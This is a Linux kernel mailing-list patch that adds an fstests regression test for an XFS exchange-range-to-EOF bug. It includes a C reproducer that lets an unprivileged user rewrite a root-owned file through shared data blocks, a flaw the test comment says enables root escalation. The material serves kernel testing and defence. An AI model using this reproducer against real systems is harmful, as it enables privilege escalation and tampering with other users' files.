Received: from smtp.kernel.org (aws-us-west-2-korg-mail-alma10-1.taild15c8.ts.net [100.103.45.18])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 76734397B02;
	Tue,  6 Oct 2026 06:15:16 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=100.103.45.18
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1791267318; cv=none; b=fq+sGmq2rauEEOJyR7RTwlwfOp+E1rb/B4zbWvrMnZpKVlZdXhxHmF/qDCMZRT/VFuELsxgpkk+J2Bxp9HZ4i3RnFCWHbAp0X3tsLSoR38OYJaWPuBxAjT8f3gxm2xI5P31aQXwqDoqChllo3/AuZKEs7iZH9lmCuQFPdK4KBcM=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1791267318; c=relaxed/simple;
	bh=Ccq+D8AOwZOdF7vM0g251c0jp+zS/L3zcJ7iRcI0iuQ=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=l31qGM0QrOpQqtJkB+7veUNyimbCpn+0QrtADyhYdBitMBb9iGkhueEJWt+6CTwx7S+NUCDUjCLnDCGm3Y2o3powo9WPwA6hwUOv0qoYTQ2OARHfPA0lk74F17FhG1i/EWMvJ++KsXQGvVgVf8GdXzrY8nOXbb+uXN2cDu8smuU=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=YKIP/mBh; arc=none smtp.client-ip=100.103.45.18
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="YKIP/mBh"
Received: by smtp.kernel.org (Postfix) with UTF8SMTPSA id C07301F00893;
	Tue,  6 Oct 2026 06:15:15 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
	s=k20260515; t=1791267315;
	bh=lMLv+qaY7OFujruLDKXDEI1jTr+gv/XYqdteTyTzRts=;
	h=Date:From:To:Cc:Subject:References:In-Reply-To;
	b=YKIP/mBhJPFabyhPcyr7t2x/LF5Ox2uJ2OaEAC4TMpkfXklGuqF9l44JY04xIcIsz
	 UWRDdf2iztc2e+YtUBJe1kWstLUDBYS/Yofi3vWsZ1kEHLLeZ/VPfujH8sYr0rJukQ
	 kXBCRIDte6GniQ5PVmhmNYy8TWpE7GPDKGOWYhZZbG0zjK0TdrwiuOrf370dTLGGyZ
	 6d72t5msixb//EwysjwR9YDn9LDPSfkZCKQk/R4xubX/jDnHyvwOyV1omvzQ84X5ZR
	 Sb/oXkzIKBLkB+NSbugqoHDndgQRiJfzrUWpCeakKcDUC4mFImqU4HhcItJgFJZxjn
	 pdo6K3C1jzxYQ==
Date: Mon, 5 Oct 2026 23:15:15 -0700
From: "Darrick J. Wong" <djwong@kernel.org>
To: Carlos Maiolino <cem@kernel.org>
Cc: Norbert Szetei <norbert@doyensec.com>, linux-xfs@vger.kernel.org,
	Christoph Hellwig <hch@infradead.org>,
	fstests <fstests@vger.kernel.org>
Subject: [PATCH] xfs: add regression test for exchangerange-to-eof reflux
Message-ID: <20261006061515.GW2705364@frogsfrogsfrogs>
References: <20261006050914.GU2705364@frogsfrogsfrogs>
Precedence: bulk
X-Mailing-List: linux-xfs@vger.kernel.org
List-Id: <linux-xfs.vger.kernel.org>
List-Subscribe: <mailto:linux-xfs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-xfs+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <20261006050914.GU2705364@frogsfrogsfrogs>

From: Darrick J. Wong <djwong@kernel.org>

This is a regression test for a bug that Norbert Szetei reported in the
XFS exchange-range ioctl.  I've ported his reproducer program to
fstests so that everyone can run it, and added an extra test that
checks that the right thing happens if you ask the kernel to exchange
unequally sized tails of two files.

Cc: Norbert Szetei <norbert@doyensec.com>
Signed-off-by: "Darrick J. Wong" <djwong@kernel.org>
---
 .gitignore                |    1 
 src/Makefile              |    2 -
 src/xfs-exchange-to-eof.c |  168 +++++++++++++++++++++++++++++++++++++++++++++
 tests/generic/1958        |  107 +++++++++++++++++++++++++++++
 tests/generic/1958.out    |    6 ++
 5 files changed, 283 insertions(+), 1 deletion(-)
 create mode 100644 src/xfs-exchange-to-eof.c
 create mode 100755 tests/generic/1958
 create mode 100644 tests/generic/1958.out

diff --git a/.gitignore b/.gitignore
index b5d85c9451f0a8..2bf7043d1cc7eb 100644
--- a/.gitignore
+++ b/.gitignore
@@ -186,6 +186,7 @@ tags
 /src/uuid_ioctl
 /src/writemod
 /src/writev_on_pagefault
+/src/xfs-exchange-to-eof
 /src/xfsctl
 /src/xfsfind
 /src/aio-dio-regress/aio-dio-append-write-fallocate-race
diff --git a/src/Makefile b/src/Makefile
index 04a73b76546241..bfbb6cd5f3c690 100644
--- a/src/Makefile
+++ b/src/Makefile
@@ -36,7 +36,7 @@ LINUX_TARGETS = xfsctl bstat t_mtab getdevicesize preallo_rw_pattern_reader \
 	fscrypt-crypt-util bulkstat_null_ocount splice-test chprojid_fail \
 	detached_mounts_propagation ext4_resize t_readdir_3 splice2pipe \
 	uuid_ioctl t_snapshot_deleted_subvolume fiemap-fault min_dio_alignment \
-	rw_hint btrfs_ioctl refluxfs
+	rw_hint btrfs_ioctl refluxfs xfs-exchange-to-eof
 
 EXTRA_EXECS = dmerror fill2attr fill2fs fill2fs_check scaleread.sh \
 	      btrfs_crc32c_forged_name.py popdir.pl popattr.py \
diff --git a/src/xfs-exchange-to-eof.c b/src/xfs-exchange-to-eof.c
new file mode 100644
index 00000000000000..045bb3b97ae135
--- /dev/null
+++ b/src/xfs-exchange-to-eof.c
@@ -0,0 +1,168 @@
+// SPDX-License-Identifier: GPL-2.0
+
+// Trick exchange-range-to-EOF into screwing up the file size exchange
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <sys/stat.h>
+#include <sys/vfs.h>
+#include <linux/fs.h>
+#include <linux/fiemap.h>
+#include <errno.h>
+
+#ifndef FICLONERANGE
+#define FICLONERANGE _IOW(0x94, 13, struct file_clone_range)
+#endif
+
+#ifndef XFS_EXCHANGE_RANGE_TO_EOF
+struct xfs_exchange_range {
+	__s32		file1_fd;
+	__u32		pad;
+	__u64		file1_offset;
+	__u64		file2_offset;
+	__u64		length;
+	__u64		flags;
+};
+#define XFS_IOC_EXCHANGE_RANGE		_IOW('X', 129, struct xfs_exchange_range)
+#define XFS_EXCHANGE_RANGE_TO_EOF	(1ULL << 0)
+#endif
+
+static unsigned long blksz;
+static int peer, f1;
+
+static unsigned long long phys(int fd, unsigned long long off)
+{
+	struct { struct fiemap f; struct fiemap_extent e[1]; } q;
+
+	memset(&q, 0, sizeof q);
+	q.f.fm_start = off;
+	q.f.fm_length = blksz;
+	q.f.fm_extent_count = 1;
+	if (ioctl(fd, FS_IOC_FIEMAP, &q.f) || q.f.fm_mapped_extents < 1)
+		return 0;
+	return (q.e[0].fe_physical + (off - q.e[0].fe_logical)) / blksz;
+}
+
+static void show(const char *tag)
+{
+	struct stat st;
+	int i;
+
+	fstat(f1, &st);
+	printf("%-26s peer [%llu]   file1 size %5lld  [", tag, phys(peer, 0),
+	       (long long)st.st_size);
+	for (i = 0; i < 3; i++)
+		printf("%llu%s", phys(f1, (unsigned long long)i * blksz),
+		       i == 2 ? "]\n" : "] [");
+}
+
+static int mkfile(const char *name, char fill, int blocks)
+{
+	char *buf;
+	int fd;
+
+	unlink(name);
+	fd = open(name, O_RDWR | O_CREAT | O_EXCL, 0600);
+	if (fd < 0)
+		return fprintf(stderr, "open %s: %m\n", name), -1;
+	buf = malloc(blocks * blksz);
+	memset(buf, fill, blocks * blksz);
+	if (pwrite(fd, buf, blocks * blksz, 0) != (ssize_t)(blocks * blksz))
+		return fprintf(stderr, "pwrite %s: %m\n", name), -1;
+	free(buf);
+	fsync(fd);
+	return fd;
+}
+
+int main(int argc, char *argv[])
+{
+	struct xfs_exchange_range xr;
+	struct file_clone_range cr;
+	char before[65536], after[65536], *buf;
+	struct statfs sfs;
+	struct stat st;
+	int d1, d2;
+
+	if (argc != 3) {
+		fprintf(stderr, "Usage: $0 dir path_to_peer\n");
+		return 2;
+	}
+
+	if (chdir(argv[1]))
+		return perror(argv[1]), 2;
+
+	if (statfs(".", &sfs))
+		return fprintf(stderr, "statfs: %m\n"), 2;
+	blksz = sfs.f_bsize;
+	if (blksz < 512 || blksz > 65536)
+		return fprintf(stderr, "unexpected block size %lu\n", blksz), 2;
+
+	peer = open(argv[2], O_RDONLY);
+	if (peer < 0)
+		return fprintf(stderr, "open peer %s: %m\n", argv[2]), 2;
+	syncfs(peer);		/* so FIEMAP reports peer's real blocks */
+	fstat(peer, &st);
+	printf("peer uid %u mode %04o size %lld, block size %lu\n\n",
+	       st.st_uid, st.st_mode & 07777, (long long)st.st_size, blksz);
+	if (pread(peer, before, blksz, 0) != (ssize_t)blksz)
+		return fprintf(stderr, "read peer: %m\n"), 2;
+
+	f1 = mkfile("file1", 'A', 3);
+	d1 = mkfile("donor1", 'B', 1);
+	d2 = mkfile("donor2", 'C', 1);
+	if (f1 < 0 || d1 < 0 || d2 < 0)
+		return 2;
+	show("start");
+
+	/* 1. share peer's block into the middle of file1 */
+	cr = (struct file_clone_range){ .src_fd = peer, .src_offset = 0,
+					.src_length = blksz,
+					.dest_offset = blksz };
+	if (ioctl(f1, FICLONERANGE, &cr))
+		return fprintf(stderr, "FICLONERANGE: %m\n"), 2;
+	show("1 FICLONERANGE");
+
+	/*
+	 * 2. exchange file1's last block against the whole of donor1 with
+	 * TO_EOF.  The sizes are exchanged too, so file1 claims one block
+	 * while still owning three.  file2_offset is block 2, so this exchange
+	 * cannot clear a reflink flag.
+	 */
+	xr = (struct xfs_exchange_range){ .file1_fd = d1, .file1_offset = 0,
+					  .file2_offset = 2 * blksz,
+					  .length = 0,
+					  .flags = XFS_EXCHANGE_RANGE_TO_EOF };
+	if (ioctl(f1, XFS_IOC_EXCHANGE_RANGE, &xr))
+		return fprintf(stderr, "EXCHANGE_RANGE TO_EOF: %m\n"), 2;
+	show("2 EXCHANGE_RANGE TO_EOF");
+
+	/*
+	 * 3. by i_disk_size this is a whole-file exchange of two one-block
+	 * files, so the reflink flag is handed to donor2 and cleared off
+	 * file1, which still shares a block with peer.
+	 */
+	xr = (struct xfs_exchange_range){ .file1_fd = d2, .file1_offset = 0,
+					  .file2_offset = 0, .length = blksz };
+	if (ioctl(f1, XFS_IOC_EXCHANGE_RANGE, &xr))
+		return fprintf(stderr, "EXCHANGE_RANGE: %m\n"), 2;
+	show("3 EXCHANGE_RANGE");
+
+	/* 4. write to the block file1 still shares with peer */
+	buf = malloc(blksz);
+	memset(buf, 'X', blksz);
+	if (pwrite(f1, buf, blksz, blksz) != (ssize_t)blksz)
+		return fprintf(stderr, "pwrite: %m\n"), 2;
+	fsync(f1);
+	show("4 pwrite(file1, 4096)");
+
+	posix_fadvise(peer, 0, 0, POSIX_FADV_DONTNEED);
+	if (pread(peer, after, blksz, 0) != (ssize_t)blksz)
+		return fprintf(stderr, "re-read peer: %m\n"), 2;
+	printf("\npeer first byte %c -> %c   %s\n", before[0], after[0],
+	       memcmp(before, after, blksz) ? "PEER REWRITTEN" : "peer intact");
+	return memcmp(before, after, blksz) ? 0 : 1;
+}
diff --git a/tests/generic/1958 b/tests/generic/1958
new file mode 100755
index 00000000000000..7adfa1aee768ca
--- /dev/null
+++ b/tests/generic/1958
@@ -0,0 +1,107 @@
+#! /bin/bash
+# SPDX-License-Identifier: GPL-2.0
+# Copyright (c) 2026 Oracle.  All Rights Reserved.
+#
+# FS QA Test No. 1958
+#
+# Regression test for an exchange-range-to-EOF bug which unintentionally
+# results in files that share data blocks but don't have the reflink flag set.
+# This enables attackers to rewrite shared blocks to gain root privileges,
+# similar to refluxfs.
+. ./common/preamble
+_begin_fstest auto quick fiexchange
+
+. ./common/filter
+. ./common/reflink
+
+_require_test_program "xfs-exchange-to-eof"
+_require_user fsgqa
+_require_group fsgqa
+_require_scratch_reflink
+_require_xfs_io_command exchangerange
+_require_cp_reflink
+
+_fixed_by_fs_commit xfs XXXXXXXXXXXXXX \
+	"xfs: fix exchange-range-to-eof file size exchange"
+
+_scratch_mkfs >> $seqres.full
+_scratch_mount
+
+rootdir=$SCRATCH_MNT/root
+userdir=$SCRATCH_MNT/user
+blksz=$(_get_file_block_size $SCRATCH_MNT)
+
+# Fill $mnt/peer with "P", run reproducer program
+mkdir -p $rootdir $userdir
+$XFS_IO_PROG -f -c "pwrite -S 0x50 0 $blksz" $rootdir/peer.copy >> $seqres.full
+$XFS_IO_PROG -f -c "pwrite -S 0x50 0 $blksz" $rootdir/peer >> $seqres.full
+sync
+
+chown $qa_user:$qa_group $userdir
+chmod +r $rootdir/peer
+
+_su $qa_user -c "$here/src/xfs-exchange-to-eof $userdir $rootdir/peer" &> $tmp.out
+
+# Now do an exchange where the distance between the offset and EOF are
+# different for the two files.
+l1sz=12345678			# file size for lopsided1
+l2sz=1234567			# file size for lopsided2
+
+l1rem=$((l1sz % 1048576))
+l2rem=$((l2sz % 65536))
+
+l1off=$((l1sz - l1rem))		# lopsided1 size rounded down to 1M
+l2off=$((l2sz - l2rem))		# lopsided2 size rounded down to 64k
+
+$XFS_IO_PROG -f -c "pwrite -S 0x58 0 $l1sz" $rootdir/lopsided1 >> $seqres.full
+$XFS_IO_PROG -f -c "pwrite -S 0x59 0 $l2sz" $rootdir/lopsided2 >> $seqres.full
+
+$XFS_IO_PROG -f \
+	-c "pwrite -S 0x58 0 $l1off" \
+	-c "pwrite -S 0x59 $l1off $l2rem" \
+	$rootdir/lopsided1.copy >> $seqres.full
+$XFS_IO_PROG -f \
+	-c "pwrite -S 0x59 0 $l2off" \
+	-c "pwrite -S 0x58 $l2off $l1rem" \
+	$rootdir/lopsided2.copy >> $seqres.full
+sync
+
+$XFS_IO_PROG -c "exchangerange -d $l1off -s $l2off -t $rootdir/lopsided2" \
+	$rootdir/lopsided1 >> $seqres.full
+
+# Check for file corruption
+grep -q REWRITTEN $tmp.out && \
+	echo "$rootdir/peer rewritten, filesystem corrupt!"
+cat $tmp.out >> $seqres.full
+
+cmp -s $rootdir/peer.copy $rootdir/peer || \
+	echo "$rootdir/peer changed since its snapshot, filesystem corrupt!"
+
+stat -c '%n:%s' $rootdir/lopsided[12] | _filter_scratch
+
+cmp -s $rootdir/lopsided1.copy $rootdir/lopsided1 || \
+	echo "$rootdir/lopsided1 is wrong, filesystem corrupt"
+cmp -s $rootdir/lopsided2.copy $rootdir/lopsided2 || \
+	echo "$rootdir/lopsided2 is wrong, filesystem corrupt"
+
+# Check reflink flags
+_scratch_unmount
+_scratch_xfs_db -c "path /user/file1" -c 'print' | grep v3.reflink
+_scratch_mount
+
+# Check for file corruption now that we've blown away all caches
+grep -q REWRITTEN $tmp.out && \
+	echo "$rootdir/peer rewritten, filesystem corrupt!"
+cat $tmp.out >> $seqres.full
+
+cmp -s $rootdir/peer.copy $rootdir/peer || \
+	echo "$rootdir/peer changed since its snapshot, filesystem corrupt!"
+
+stat -c '%n:%s' $rootdir/lopsided[12] | _filter_scratch
+
+cmp -s $rootdir/lopsided1.copy $rootdir/lopsided1 || \
+	echo "$rootdir/lopsided1 is wrong, filesystem corrupt"
+cmp -s $rootdir/lopsided2.copy $rootdir/lopsided2 || \
+	echo "$rootdir/lopsided2 is wrong, filesystem corrupt"
+
+_exit 0
diff --git a/tests/generic/1958.out b/tests/generic/1958.out
new file mode 100644
index 00000000000000..f241bb075349e9
--- /dev/null
+++ b/tests/generic/1958.out
@@ -0,0 +1,6 @@
+QA output created by 1958
+SCRATCH_MNT/root/lopsided1:11589255
+SCRATCH_MNT/root/lopsided2:1990990
+v3.reflink = 1
+SCRATCH_MNT/root/lopsided1:11589255
+SCRATCH_MNT/root/lopsided2:1990990
